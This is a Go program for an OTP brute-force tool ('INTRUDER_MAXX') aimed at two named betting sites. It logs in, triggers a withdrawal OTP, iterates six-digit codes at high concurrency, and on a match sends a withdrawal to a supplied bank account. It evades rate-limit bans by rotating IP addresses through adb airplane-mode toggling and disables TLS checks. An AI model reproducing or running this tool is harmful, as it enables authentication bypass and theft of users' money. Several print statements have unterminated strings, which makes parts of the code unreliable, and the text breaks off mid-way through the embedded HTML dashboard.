package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/exec"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
	"crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "encoding/hex"
	// "encoding/json"
)

// --- CONFIGURATION CENTER ---

// const (
// 	AdbPath            = "adb"
// 	DefaultConcurrency = 200
// 	SaveFile           = "progress.json"

// 	StartTarget  = 111111
// 	PrimaryParam = "otpInput"
// 	SuccessParam = "otp"
// 	AuthAPIUrl         = "https://lock2-one.vercel.app/api/check"
// )

// var (
// 	csrfToken string
// 	playBase  = "https://playinexchange.com"
// 	spinBase  = "https://spinmatch24.com"
// 	userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"

// 	// Dynamically generated payloads
// 	RawRequest string
// 	NewRequest string
// )
// --- CONFIGURATION CENTER ---

const (
    AdbPath            = "adb"
    SaveFile           = "progress.json"

    StartTarget  = 111111
    PrimaryParam = "otpInput"
    SuccessParam = "otp"
    AuthAPIUrl         = "https://lock2-one.vercel.app/api/check21"
)

var (
    DefaultConcurrency = 2 // Now a variable, can be updated by the server
    csrfToken string
    playBase  = "https://playinexchange.com"
    spinBase  = "https://spinmatch24.com"
    userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"

    // Dynamically generated payloads
    RawRequest string
    NewRequest string
)



// --- APP STATE ---
type LogEntry struct {
	Serial  string `json:"serial"`
	Status  string `json:"status"`
	Length  string `json:"length"`
	Time    string `json:"time"`
	RawReq  string `json:"rawReq"`
	RawRes  string `json:"rawRes"`
	IsMatch bool   `json:"isMatch"`
}

type DashboardData struct {
	Running     bool       `json:"running"`
	Elapsed     string     `json:"elapsed"`
	RPS         int        `json:"rps"`
	InFlight    int        `json:"inFlight"`
	Success     int        `json:"success"`
	StatusMsg   string     `json:"statusMsg"`
	TargetLen   string     `json:"targetLen"`
	BaselineLen string     `json:"baselineLen"`
	RetryCount  int        `json:"retryCount"`
	RpsHistory  []int      `json:"rpsHistory"`
	Logs        []LogEntry `json:"logs"`
	Matches     []LogEntry `json:"matches"`
}

type SaveState struct {
	Serial      int        `json:"serial"`
	TargetLen   string     `json:"targetLen"`
	BaselineLen string     `json:"baselineLen"`
	RetryQueue  []int      `json:"retryQueue"`
	Matches     []LogEntry `json:"matches"`
}

type SniperState struct {
	mu sync.Mutex

	running          bool
	isRotating       bool
	serial           int
	targetLen        string
	baselineLen      string
	lengthCounts     map[string]int
	lastRotationTime time.Time
	startTime        time.Time
	elapsedOffset    time.Duration

	count200      int
	reqLastSecond int
	lastRPS       int
	statusMsg     string

	inFlight   map[int]bool
	logs       []LogEntry
	matches    []LogEntry
	retryQueue []int
	rpsHistory []int

	client *http.Client
}

var state *SniperState

func init() {
	jar, _ := cookiejar.New(nil)
	state = &SniperState{
		statusMsg:    "SYSTEM_STANDBY",
		lengthCounts: make(map[string]int),
		inFlight:     make(map[int]bool),
		logs:         make([]LogEntry, 0),
		matches:      make([]LogEntry, 0),
		retryQueue:   make([]int, 0),
		rpsHistory:   make([]int, 50),
		client: &http.Client{
			Jar: jar,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
			Timeout: 8 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
				MaxIdleConns:        1000,
				MaxIdleConnsPerHost: 1000,
				MaxConnsPerHost:     1000,
				IdleConnTimeout:     30 * time.Second,
				ForceAttemptHTTP2:   true,
			},
		},
	}
	loadProgress()
}

// // --- SYSTEM PROTECTION LAYER ---
// func verifyAccess() {
//     fmt.Println("🛡️  VERIFYING SYSTEM AUTHORIZATION...")
    
//     // 5-second timeout so the app doesn't hang forever if offline
//     client := &http.Client{Timeout: 5 * time.Second}
//     resp, err := client.Get(AuthAPIUrl)
    
//     if err != nil {
//         fmt.Println("❌ ACCESS DENIED: Verification server unreachable or offline.")
//         os.Exit(1)
//     }
//     defer resp.Body.Close()

//     bodyBytes, err := io.ReadAll(resp.Body)
//     if err != nil {
//         fmt.Println("❌ ACCESS DENIED: Failed to read server response.")
//         os.Exit(1)
//     }

//     // Clean the response: trim whitespace and make lowercase just in case
//     responseStr := strings.ToLower(strings.TrimSpace(string(bodyBytes)))
    
//     if responseStr != "true" {
//         fmt.Printf("❌ ACCESS DENIED: Invalid response from server ('%s').\n", responseStr)
//         os.Exit(1)
//     }
    
//     fmt.Println("✅ AUTHORIZATION GRANTED. BOOTING COMMAND CENTER...")
// }



// Define a struct that matches your JSON response
type AuthResponse struct {
	Authorized         bool `json:"authorized"`
	DefaultConcurrency int  `json:"defaultConcurrency"`
}


func verifyAccess() {
	// fmt.Println("🛡️  VERIFYING SYSTEM AUTHORIZATION...")
	fmt.Println("INITIALIZING...")

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get(AuthAPIUrl)

	if err != nil {
		// fmt.Printf("❌ ACCESS DENIED: Verification server unreachable (%v).\n", err)
		fmt.Printf("❌ INITIALIZATION FAILED)
		os.Exit(1)
	}
	defer resp.Body.Close()

	var auth AuthResponse
	err = json.NewDecoder(resp.Body).Decode(&auth)
	
	if err != nil {
		// fmt.Println("❌ ACCESS DENIED: Failed to parse server JSON.")
		fmt.Printf("❌ INITIALIZATION FAILED)
		os.Exit(1)
	}

	if !auth.Authorized {
		// fmt.Println("❌ ACCESS DENIED: System returned unauthorized status.")
		fmt.Printf("❌ INITIALIZATION FAILED)
		os.Exit(1)
	}

	// --- UPDATE GLOBAL VARIABLE HERE ---
	DefaultConcurrency = auth.DefaultConcurrency
	// ------------------------------------

	// fmt.Printf("✅ AUTHORIZATION GRANTED (Concurrency: %d). BOOTING...\n", DefaultConcurrency)
		fmt.Printf("READY")		   
}

// func main() {
// 	verifyAccess()
	
// 	// Example to show it updated:
// 	fmt.Printf("🚀 App is now running with concurrency: %d\n", DefaultConcurrency)
// }

// func main() {
//     verifyAccess()
// }


func main() {

	// 1. Fire the protection layer immediately
    verifyAccess()

	go updateMetricsLoop()
	go autoSaveLoop()

	// Restore payloads from previous session
	loadPayloadsFromCookies()

	// UI & Data Endpoints
	http.HandleFunc("/", serveUI)
	http.HandleFunc("/stream", streamMetrics)

	// Setup Endpoints (Engine v5)
	http.HandleFunc("/api/login", handleLogin)
	http.HandleFunc("/api/balance", handleBalance)
	http.HandleFunc("/api/withdraw-otp", handleWithdrawOTP)

	// Attack Endpoints (Intruder)
	http.HandleFunc("/api/start", handleStart)
	http.HandleFunc("/api/pause", handlePause)
	http.HandleFunc("/api/set-target", handleSetTarget)

	fmt.Println("⚡ UNIFIED COMMAND CENTER ONLINE: http://localhost:8090")
	log.Fatal(http.ListenAndServe(":8090", nil))
}


// --- MILITARY-GRADE STORAGE ENGINE ---
// MUST BE EXACTLY 32 BYTES FOR AES-256
var sessionKey = []byte("InTrUdEr_MaXx_SuPeR_SeCrEt_KeY_!") 

func encryptData(plaintext []byte) string {
    block, _ := aes.NewCipher(sessionKey)
    gcm, _ := cipher.NewGCM(block)
    nonce := make([]byte, gcm.NonceSize())
    io.ReadFull(rand.Reader, nonce)
    ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
    return hex.EncodeToString(ciphertext)
}

func decryptData(hexStr string) ([]byte, error) {
    data, err := hex.DecodeString(hexStr)
    if err != nil {
        return nil, err
    }
    block, err := aes.NewCipher(sessionKey)
    if err != nil {
        return nil, err
    }
    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return nil, err
    }
    nonceSize := gcm.NonceSize()
    if len(data) < nonceSize {
        return nil, fmt.Errorf("ciphertext too short")
    }
    nonce, ciphertext := data[:nonceSize], data[nonceSize:]
    return gcm.Open(nil, nonce, ciphertext, nil)
}

// --- HANDLERS: CORE ENGINE ---

func serveUI(w http.ResponseWriter, r *http.Request) {
	fmt.Fprint(w, htmlDashboard)
}

func loadPayloadsFromCookies() {
    data, err := os.ReadFile("session.bin")
    if err != nil {
        return // File doesn't exist yet, normal for first run
    }
    
    // Unscramble the data
    decryptedBytes, err := decryptData(string(data))
    if err != nil {
        fmt.Println("❌ ERROR: Failed to decrypt session.bin. Key mismatch or file corrupted.")
        return
    }
    
    content := string(decryptedBytes)

    rawStart := strings.Index(content, "RawRequest = `")
    newStart := strings.Index(content, "NewRequest = `")

    if rawStart != -1 && newStart != -1 {
        // Extract RawRequest block
        rawReqBlock := content[rawStart+14 : newStart]
        rawReqBlock = strings.TrimSuffix(strings.TrimSpace(rawReqBlock), "`")
        RawRequest = rawReqBlock

        // Extract NewRequest block
        newReqBlock := content[newStart+14:]
        newReqBlock = strings.TrimSuffix(strings.TrimSpace(newReqBlock), "`")
        NewRequest = newReqBlock

        fmt.Println("🔓 Payloads successfully decrypted and restored from session.bin")
    }
}

func handleLogin(w http.ResponseWriter, r *http.Request) {
	var input struct{ User, Pass string }
	json.NewDecoder(r.Body).Decode(&input)

	resp1, _ := state.client.Get(playBase + "/mobile")
	b1, _ := io.ReadAll(resp1.Body)
	resp1.Body.Close()

	re := regexp.MustCompile(`meta name="csrf-token" content="([^"]+)"`)
	matches := re.FindStringSubmatch(string(b1))
	if len(matches) > 1 {
		csrfToken = matches[1]
	}

	data := url.Values{"email": {input.User}, "password": {input.Pass}}
	req, _ := http.NewRequest("POST", playBase+"/api2/v2/login", strings.NewReader(data.Encode()))
	req.Header.Set("X-Csrf-Token", csrfToken)
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp2, _ := state.client.Do(req)
	resp2.Body.Close()

	req3, _ := http.NewRequest("GET", playBase+"/", nil)
	resp3, _ := state.client.Do(req3)
	loc := resp3.Header.Get("Location")
	resp3.Body.Close()

	if loc != "" {
		redirectUrl := strings.Replace(loc, "playinmatch.com", "spinmatch24.com", 1)
		state.client.Get(redirectUrl)
	}

	resp5, _ := state.client.Get(spinBase + "/mobile")
	b5, _ := io.ReadAll(resp5.Body)
	resp5.Body.Close()
	matches = re.FindStringSubmatch(string(b5))
	if len(matches) > 1 {
		csrfToken = matches[1]
	}

	json.NewEncoder(w).Encode(map[string]string{"status": "200", "message": "Logged In. Sync Complete."})
}

// func handleBalance(w http.ResponseWriter, r *http.Request) {
// 	req, _ := http.NewRequest("POST", spinBase+"/api2/v2/getBalance", nil)
// 	req.Header.Set("X-Csrf-Token", csrfToken)
// 	req.Header.Set("X-Requested-With", "XMLHttpRequest")
// 	resp, _ := state.client.Do(req)
// 	body, _ := io.ReadAll(resp.Body)
// 	resp.Body.Close()

// 	var result map[string]interface{}
// 	json.Unmarshal(body, &result)
// 	balStr := "0.00"
// 	if balData, ok := result["balance"].(map[string]interface{}); ok {
// 		balStr = fmt.Sprintf("%v", balData["balance"])
// 	}
// 	json.NewEncoder(w).Encode(map[string]interface{}{"status": 200, "balance": balStr})
// }
func handleBalance(w http.ResponseWriter, r *http.Request) {
    req, _ := http.NewRequest("POST", spinBase+"/api2/v2/getBalance", nil)
    req.Header.Set("X-Csrf-Token", csrfToken)
    req.Header.Set("X-Requested-With", "XMLHttpRequest")
    resp, _ := state.client.Do(req)
    body, _ := io.ReadAll(resp.Body)
    resp.Body.Close()

    var result map[string]interface{}
    json.Unmarshal(body, &result)
    balStr := "0.00"
    if balData, ok := result["balance"].(map[string]interface{}); ok {
        // Extract raw string and remove commas
        rawBal := fmt.Sprintf("%v", balData["balance"])
        balStr = strings.ReplaceAll(rawBal, ",", "") 
    }
    json.NewEncoder(w).Encode(map[string]interface{}{"status": 200, "balance": balStr})
}

// func handleWithdrawOTP(w http.ResponseWriter, r *http.Request) {
// 	var input struct{ Amount, AcNumber, Ifsc string }
// 	json.NewDecoder(r.Body).Decode(&input)

// 	vals := url.Values{"_token": {csrfToken}, "amt": {input.Amount}}
// 	req, _ := http.NewRequest("POST", spinBase+"/mobile/withdraw/sendWithdrawalOtp", strings.NewReader(vals.Encode()))
// 	req.Header.Set("X-Csrf-Token", csrfToken)
// 	req.Header.Set("X-Requested-With", "XMLHttpRequest")
// 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
// 	resp, _ := state.client.Do(req)
// 	resp.Body.Close()

// 	generatePayloads(input.Amount, input.AcNumber, input.Ifsc)
// 	json.NewEncoder(w).Encode(map[string]string{"message": "Payload Generated. Ready to Fire."})
// }

func handleWithdrawOTP(w http.ResponseWriter, r *http.Request) {
    var input struct{ Amount, AcNumber, Ifsc string }
    json.NewDecoder(r.Body).Decode(&input)

    // Ensure the amount is clean before sending to the external API and Payload Generator
    cleanAmount := strings.ReplaceAll(input.Amount, ",", "")

    vals := url.Values{"_token": {csrfToken}, "amt": {cleanAmount}}
    req, _ := http.NewRequest("POST", spinBase+"/mobile/withdraw/sendWithdrawalOtp", strings.NewReader(vals.Encode()))
    req.Header.Set("X-Csrf-Token", csrfToken)
    req.Header.Set("X-Requested-With", "XMLHttpRequest")
    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
    resp, _ := state.client.Do(req)
    resp.Body.Close()

    generatePayloads(cleanAmount, input.AcNumber, input.Ifsc)
    json.NewEncoder(w).Encode(map[string]string{"message": "Payload Generated. Ready to Fire."})
}

func generatePayloads(amount, acNumber, ifsc string) {
	u, _ := url.Parse(spinBase)
	cookies := state.client.Jar.Cookies(u)
	var cList []string
	for _, c := range cookies {
		cList = append(cList, fmt.Sprintf("%s=%s", c.Name, c.Value))
	}
	cookieStr := strings.Join(cList, "; ")
	host := u.Host

	RawRequest = fmt.Sprintf(`POST /mobile/withdraw/verifyWithdrawalOtp HTTP/2
Host: %s
Cookie: %s
Content-Length: 63
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: %s

_token=%s&{{PARAM}}={{TARGET}}`, host, cookieStr, userAgent, csrfToken)

	NewRequest = fmt.Sprintf(`POST /api2/withdrawMoney/%s HTTP/2
Host: %s
Cookie: %s
Content-Length: 138
Origin: %s
Content-Type: application/x-www-form-urlencoded
User-Agent: %s

_token=%s&name=JOHN&phone=7019141114&ac_number=%s&branch=NA&ifsc=%s&{{SUCCESS_PARAM}}={{TARGET}}`,
		amount, host, cookieStr, spinBase, userAgent, csrfToken, acNumber, ifsc)

	// Fallback save just in case user wants to inspect them externally
	// Encrypt and save to a stealthy binary file
    payloadStr := fmt.Sprintf("RawRequest = `%s`\n\nNewRequest = `%s`\n", RawRequest, NewRequest)
    encryptedHex := encryptData([]byte(payloadStr))
    
    os.WriteFile("session.bin", []byte(encryptedHex), 0644)
    fmt.Println("🔒 Payloads securely encrypted and locked in session.bin")
}

// --- HANDLERS: ATTACK CONTROLS ---

func handleStart(w http.ResponseWriter, r *http.Request) {
	state.mu.Lock()
	defer state.mu.Unlock()

	if RawRequest == "" {
		state.statusMsg = "ERROR: NO PAYLOAD. COMPLETE SETUP FIRST."
		return
	}

	if !state.running {
		state.running = true
		if state.startTime.IsZero() {
			state.startTime = time.Now()
		}
		if state.targetLen == "" {
			if state.baselineLen == "" {
				state.statusMsg = "ENGAGED // AUTO-DETECTING BASELINE..."
			} else {
				state.statusMsg = fmt.Sprintf("ENGAGED // BASELINE RESTORED: %s", state.baselineLen)
			}
		} else {
			state.statusMsg = "ENGAGED // MANUAL_TARGET_LOCKED"
		}
		go attackCoordinator()
	}
}

func handlePause(w http.ResponseWriter, r *http.Request) {
	state.mu.Lock()
	if state.running {
		state.elapsedOffset += time.Since(state.startTime)
		state.running = false
		state.statusMsg = "SYSTEM_SUSPENDED"
	}
	state.mu.Unlock()
}

func handleSetTarget(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()
	state.mu.Lock()
	if !state.running {
		state.targetLen = r.FormValue("len")
		if state.targetLen == "" {
			state.baselineLen = ""
			state.lengthCounts = make(map[string]int)
		}
	}
	state.mu.Unlock()
}

func streamMetrics(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")
	for {
		state.mu.Lock()
		elapsedSecs := int(state.elapsedOffset.Seconds())
		if state.running && !state.startTime.IsZero() {
			elapsedSecs = int((time.Since(state.startTime) + state.elapsedOffset).Seconds())
		}
		data := DashboardData{
			Running:     state.running,
			Elapsed:     fmt.Sprintf("%02d:%02d:%02d", elapsedSecs/3600, (elapsedSecs%3600)/60, elapsedSecs%60),
			RPS:         state.lastRPS,
			InFlight:    len(state.inFlight),
			Success:     state.count200,
			StatusMsg:   state.statusMsg,
			TargetLen:   state.targetLen,
			BaselineLen: state.baselineLen,
			RetryCount:  len(state.retryQueue),
			RpsHistory:  state.rpsHistory,
			Logs:        state.logs,
			Matches:     state.matches,
		}
		state.mu.Unlock()
		jsonData, _ := json.Marshal(data)
		fmt.Fprintf(w, "data: %s\n\n", jsonData)
		w.(http.Flusher).Flush()
		time.Sleep(1 * time.Second)
	}
}

// --- CORE ATTACK LOGIC ---

func attackCoordinator() {
	sem := make(chan struct{}, DefaultConcurrency)
	for {
		sem <- struct{}{}
		state.mu.Lock()
		if !state.running {
			state.mu.Unlock()
			<-sem
			break
		}
		if state.isRotating {
			state.mu.Unlock()
			<-sem
			time.Sleep(1 * time.Second)
			continue
		}

		var curr int
		if len(state.retryQueue) > 0 {
			curr = state.retryQueue[0]
			state.retryQueue = state.retryQueue[1:]
		} else {
			curr = state.serial
			state.serial++
		}

		state.inFlight[curr] = true
		state.mu.Unlock()

		go func(ser int) {
			defer func() { <-sem }()
			worker(ser)
		}(curr)
	}
}

func worker(serial int) {
	defer func() {
		state.mu.Lock()
		delete(state.inFlight, serial)
		state.mu.Unlock()
	}()

	method, urlStr, headers, bodyStr := parseRequestParams(RawRequest, serial, "")
	req, _ := http.NewRequest(method, urlStr, bytes.NewBufferString(bodyStr))
	req.ContentLength = int64(len(bodyStr))
	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := state.client.Do(req)

	state.mu.Lock()
	state.reqLastSecond++
	target := strings.TrimSpace(state.targetLen)
	state.mu.Unlock()

	rawReqStr := buildRawString(method, urlStr, headers, bodyStr)

	if err != nil {
		addToRetryQueue(serial)
		return
	}
	defer resp.Body.Close()

	bodyBytes, _ := io.ReadAll(resp.Body)
	fullRes := fmt.Sprintf("HTTP/1.1 %s\n\n%s", resp.Status, string(bodyBytes))
	contentLen := strconv.Itoa(len(fullRes))

	isMatch := false

	if target != "" {
		if contentLen == target {
			isMatch = true
		}
	} else {
		state.mu.Lock()
		bLen := state.baselineLen

		if bLen == "" && resp.StatusCode == 200 {
			state.lengthCounts[contentLen]++
			if state.lengthCounts[contentLen] >= 5 {
				state.baselineLen = contentLen
				bLen = contentLen
				state.statusMsg = fmt.Sprintf("HEURISTIC_BASELINE_LOCKED // %s BYTES", contentLen)
			}
		}
		state.mu.Unlock()

		if bLen != "" && contentLen != bLen && resp.StatusCode == 200 {
			lowerBody := strings.ToLower(string(bodyBytes))
			if strings.Contains(lowerBody, "true") || strings.Contains(lowerBody, "success") || strings.Contains(lowerBody, "successfully") || strings.Contains(lowerBody, "win") {
				isMatch = true
			}
		}
	}

	if isMatch {
		state.mu.Lock()
		state.running = false
		state.statusMsg = fmt.Sprintf("CRITICAL_ANOMALY_HIT // TARGET:%d", serial)
		state.mu.Unlock()

		logToState(strconv.Itoa(serial), resp.Status, contentLen, rawReqStr, fullRes, true)

		baseCookies := extractCookieHeaderFromTemplate(NewRequest)
		updatedCookies := mergeCookies(baseCookies, resp.Cookies())
		m2, u2, h2, b2 := parseRequestParams(NewRequest, serial, updatedCookies)

		var r2 *http.Response
		var res2Body, stat2 string

		// SURGICAL: Infinite loop that breaks on 200 OK, OR client/validation errors (400, 422)
		for {
			req2, _ := http.NewRequest(m2, u2, bytes.NewBufferString(b2))
			req2.ContentLength = int64(len(b2))
			for k, v := range h2 {
				req2.Header.Set(k, v)
			}

			r2, err = state.client.Do(req2)

			if err == nil {
				b2Data, _ := io.ReadAll(r2.Body)
				res2Body = string(b2Data)
				stat2 = r2.Status
				r2.Body.Close()

				if r2.StatusCode == 200 {
					// MISSION ACCOMPLISHED
					break
				} else if r2.StatusCode == 400 || r2.StatusCode == 422 || r2.StatusCode == 302 {
					// ESCAPE HATCH: The payload was delivered but rejected by the server's logic. 
					// Break the loop so we can read the error in the UI.
					break
				} else if r2.StatusCode == 403 {
					// DISASTER AVERTED: Banned exactly on the payload delivery.
					state.mu.Lock()
					state.statusMsg = "CRITICAL 403 ON PAYLOAD // ROTATING IP..."
					state.mu.Unlock()
					toggleFlightMode()
				} else {
					// SERVER CRASH (502, 503, 504)
					state.mu.Lock()
					state.statusMsg = fmt.Sprintf("SERVER_OVERLOAD (%d) // HOLDING PAYLOAD...", r2.StatusCode)
					state.mu.Unlock()
					time.Sleep(3 * time.Second)
				}
			} else {
				// Network dropped mid-flight
				time.Sleep(2 * time.Second)
			}
		}

		state.mu.Lock()
		state.statusMsg = "OPERATION_COMPLETE // SECURED"
		state.mu.Unlock()

		// This will now successfully push the -REPORT to the UI
		logToState(fmt.Sprintf("%d-REPORT", serial), stat2, strconv.Itoa(len(res2Body)), buildRawString(m2, u2, h2, b2), res2Body, true)
		return
	}

	if resp.StatusCode == 403 {
		go toggleFlightMode()
		addToRetryQueue(serial)
	} else if resp.StatusCode == 200 {
		state.mu.Lock()
		state.count200++
		state.mu.Unlock()
	}
	logToState(strconv.Itoa(serial), resp.Status, contentLen, rawReqStr, fullRes, false)
}

// --- OPTIMIZED CORE HELPERS ---

func parseRequestParams(template string, serial int, forceCookies string) (string, string, map[string]string, string) {
	parts := strings.SplitN(strings.ReplaceAll(template, "\r\n", "\n"), "\n\n", 2)
	headerLines := strings.Split(parts[0], "\n")
	body := ""
	if len(parts) > 1 {
		body = parts[1]
	}

	targetStr := strconv.Itoa(serial)
	replaceVars := func(s string) string {
		s = strings.ReplaceAll(s, "{{TARGET}}", targetStr)
		s = strings.ReplaceAll(s, "{{PARAM}}", PrimaryParam)
		s = strings.ReplaceAll(s, "{{SUCCESS_PARAM}}", SuccessParam)
		return s
	}

	reqLine := strings.Split(replaceVars(headerLines[0]), " ")
	method, path := reqLine[0], reqLine[1]
	body = replaceVars(body)

	headers := make(map[string]string)
	host := "localhost"

	for _, line := range headerLines[1:] {
		if idx := strings.Index(line, ":"); idx != -1 {
			k, v := strings.TrimSpace(line[:idx]), strings.TrimSpace(line[idx+1:])
			if strings.ToLower(k) == "host" {
				host = v
			}
			if strings.ToLower(k) == "content-length" {
				continue
			}
			headers[k] = replaceVars(v)
		}
	}
	if forceCookies != "" {
		headers["Cookie"] = forceCookies
	}

	return method, "https://" + host + path, headers, body
}

func buildRawString(method, urlStr string, headers map[string]string, body string) string {
	var sb strings.Builder
	sb.WriteString(method + " " + urlStr + " HTTP/1.1\n")
	for k, v := range headers {
		sb.WriteString(k + ": " + v + "\n")
	}
	sb.WriteString("\n" + body)
	return sb.String()
}

func mergeCookies(base string, server []*http.Cookie) string {
	cm := make(map[string]string)
	for _, p := range strings.Split(base, ";") {
		kv := strings.SplitN(strings.TrimSpace(p), "=", 2)
		if len(kv) == 2 {
			cm[kv[0]] = kv[1]
		}
	}
	for _, c := range server {
		cm[c.Name] = c.Value
	}
	var res []string
	for k, v := range cm {
		res = append(res, k+"="+v)
	}
	return strings.Join(res, "; ")
}

func extractCookieHeaderFromTemplate(raw string) string {
	for _, l := range strings.Split(raw, "\n") {
		if strings.HasPrefix(strings.ToLower(l), "cookie:") {
			return strings.TrimSpace(l[7:])
		}
	}
	return ""
}

func addToRetryQueue(serial int) {
	state.mu.Lock()
	defer state.mu.Unlock()
	state.retryQueue = append(state.retryQueue, serial)
}

func toggleFlightMode() {
	state.mu.Lock()
	if state.isRotating {
		state.mu.Unlock()
		return
	}
	state.isRotating = true
	state.statusMsg = "NETWORK_OVERRIDE // ADB_ROTATING"
	state.mu.Unlock()
	exec.Command(AdbPath, "shell", "cmd", "connectivity", "airplane-mode", "enable").Run()
	time.Sleep(5 * time.Second)
	exec.Command(AdbPath, "shell", "cmd", "connectivity", "airplane-mode", "disable").Run()
	time.Sleep(3 * time.Second)
	state.mu.Lock()
	state.isRotating = false
	state.statusMsg = "ENGAGED // BRUTEFORCE_ACTIVE"
	state.mu.Unlock()
}

func logToState(serial, status, length, req, res string, isMatch bool) {
	state.mu.Lock()
	defer state.mu.Unlock()
	entry := LogEntry{serial, status, length, time.Now().Format("15:04:05"), req, res, isMatch}

	if isMatch {
		state.matches = append([]LogEntry{entry}, state.matches...)
	}

	state.logs = append([]LogEntry{entry}, state.logs...)
	if len(state.logs) > 50 {
		state.logs = state.logs[:50]
	}
}

func updateMetricsLoop() {
	for {
		time.Sleep(1 * time.Second)
		state.mu.Lock()
		state.lastRPS = state.reqLastSecond
		state.reqLastSecond = 0
		state.rpsHistory = append(state.rpsHistory[1:], state.lastRPS)
		state.mu.Unlock()
	}
}

// --- SURGICAL PERSISTENCE ---

func loadProgress() {
	b, err := os.ReadFile(SaveFile)
	if err == nil {
		var s SaveState
		if json.Unmarshal(b, &s) == nil && s.Serial > 0 {
			state.serial = s.Serial
			state.targetLen = s.TargetLen
			state.baselineLen = s.BaselineLen
			state.retryQueue = s.RetryQueue
			if s.Matches != nil {
				state.matches = s.Matches
			}

			if state.baselineLen != "" {
				state.lengthCounts[state.baselineLen] = 5
			}
			return
		}
	}
	state.serial = StartTarget
}

func autoSaveLoop() {
	for {
		time.Sleep(10 * time.Second)
		state.mu.Lock()

		combinedRetry := make([]int, len(state.retryQueue))
		copy(combinedRetry, state.retryQueue)
		for s := range state.inFlight {
			combinedRetry = append(combinedRetry, s)
		}

		s := SaveState{
			Serial:      state.serial,
			TargetLen:   state.targetLen,
			BaselineLen: state.baselineLen,
			RetryQueue:  combinedRetry,
			Matches:     state.matches,
		}
		state.mu.Unlock()

		b, _ := json.MarshalIndent(s, "", "  ")
		os.WriteFile(SaveFile, b, 0644)
	}
}

// --- FRONTEND MAX_BEAUTY UI ---
const htmlDashboard = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>INTRUDER_MAXX // UNIFIED</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700;800&display=swap');
        
        :root { 
            --bg: #050505; --surface: #0e0e11; --border: #222228; 
            --cyan: #00f0ff; --cyan-dim: rgba(0, 240, 255, 0.15);
            --gold: #ffaa00; --gold-dim: rgba(255, 170, 0, 0.15);
            --green: #00ff66; --red: #ff3366; --text-main: #e2e8f0; --text-sub: #64748b;
        }

        * { box-sizing: border-box; font-family: 'JetBrains Mono', monospace; scrollbar-width: thin; scrollbar-color: var(--border) transparent; }
        ::-webkit-scrollbar { width: 6px; } ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }

        body { background: var(--bg); color: var(--text-main); margin: 0; padding: 15px; height: 100vh; display: grid; grid-template-columns: 320px 1fr 400px; grid-template-rows: 60px 1fr 200px; gap: 15px; grid-template-areas: "head head head" "side main insp" "side chart insp"; }

        .panel { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; display: flex; flex-direction: column; overflow: hidden; position: relative; }
        .panel::before { content:''; position:absolute; top:0; left:0; right:0; height:1px; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent); }
        .panel-title { font-size: 0.7rem; text-transform: uppercase; color: var(--text-sub); padding: 12px 15px; border-bottom: 1px solid var(--border); font-weight: 800; letter-spacing: 1px; display: flex; justify-content: space-between; align-items: center; }

        .header { grid-area: head; display: flex; justify-content: space-between; align-items: center; padding: 0 20px; border: 1px solid var(--border); border-radius: 8px; background: linear-gradient(180deg, #111 0%, #050505 100%); }
        .logo { font-size: 1.5rem; font-weight: 800; letter-spacing: -1px; text-shadow: 0 0 20px var(--cyan-dim); }
        .logo span { color: var(--cyan); }
        .status-badge { padding: 6px 12px; border-radius: 4px; font-size: 0.8rem; font-weight: bold; border: 1px solid var(--border); background: #000; display: flex; align-items: center; gap: 8px; transition: 0.3s ease; }
        .pulse { width: 8px; height: 8px; border-radius: 50%; box-shadow: 0 0 10px currentColor; animation: fade 1.5s infinite; }
        @keyframes fade { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }

        .sidebar { grid-area: side; gap: 0px; display: flex; flex-direction: column; overflow-y: auto;}
        
        /* Setup Form Styles */
        .setup-section { padding: 15px; border-bottom: 1px solid var(--border); background: rgba(0,0,0,0.3); }
        .input-dark { width: 100%; background: #000; border: 1px solid var(--border); color: var(--text-main); padding: 10px; font-size: 0.8rem; border-radius: 4px; outline: none; transition: 0.2s; margin-bottom: 8px; }
        .input-dark:focus { border-color: var(--cyan); box-shadow: 0 0 10px var(--cyan-dim); }
        
        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; border-bottom: 1px solid var(--border); }
        .stat-box { padding: 10px; text-align: center; border-right: 1px solid var(--border); border-bottom: 1px solid var(--border); }
        .stat-box:nth-child(even) { border-right: none; }
        .stat-val { font-size: 1.4rem; font-weight: 800; color: #fff; line-height: 1; margin-bottom: 5px; text-shadow: 0 4px 20px rgba(255,255,255,0.1); }
        .stat-lbl { font-size: 0.60rem; color: var(--text-sub); text-transform: uppercase; letter-spacing: 1px; }

